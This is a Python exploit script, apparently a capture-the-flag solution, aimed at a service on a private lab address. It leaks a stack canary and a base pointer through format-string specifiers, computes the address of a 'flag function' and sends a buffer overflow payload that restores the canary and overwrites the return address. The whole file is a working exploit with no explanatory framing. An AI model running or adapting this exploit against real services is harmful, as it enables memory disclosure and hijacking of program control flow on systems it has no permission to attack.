import socket
import struct


def recv_until(sock, end=b': '):
    data = b''
    while True:
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
        if data.endswith(end):
            return data


libc_init_address = 0x0000000000001360
print(f"__libc_init address int: {libc_init_address}")
flag_function_address = 0x00000000000011c5
print(f"flag function address int: {flag_function_address}")

offset = libc_init_address - flag_function_address
print(f"Distance to __libc_init: {offset}")
print(f"Distance to __libc_init: {hex(offset)}")
print()

# Server information
ip = '10.9.8.1'
port = 5000

# Connect to the remote server
bird_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bird_socket.connect((ip, port))

# Read the prompt asking for your name
recv_until(bird_socket)

# Send special format specifiers to leak memory content
bird_socket.sendall(b'%23$p %24$p\n')

# Read the server's response
line = recv_until(bird_socket, end=b'\n')
print(line)

# Extract the canary and base pointer values
canary, base_pointer = line.strip().split()

# Convert these hexadecimal strings to integers
canary = int(canary, 16)
base_pointer = int(base_pointer, 16)
print(f'Canary: {hex(canary)}')
print(f'Base Pointer: {hex(base_pointer)}')

# Calculate new address
new_address = base_pointer - offset
print(f"New address: {hex(new_address)}")

# Read the next prompt from the server
recv_until(bird_socket)

# Craft the payload
payload = b'A' * 136
payload += struct.pack('<Q', canary)
payload += struct.pack('<Q', new_address)

# Send the crafted payload
bird_socket.sendall(payload + b'\n')

# Attempt to read the server's response
try:
    line = recv_until(bird_socket, end=b'\n')
    print(line)
    line = recv_until(bird_socket, end=b'\n')
    print(line)
except:
    print("Connection closed by remote host")

# Close the socket
bird_socket.close()
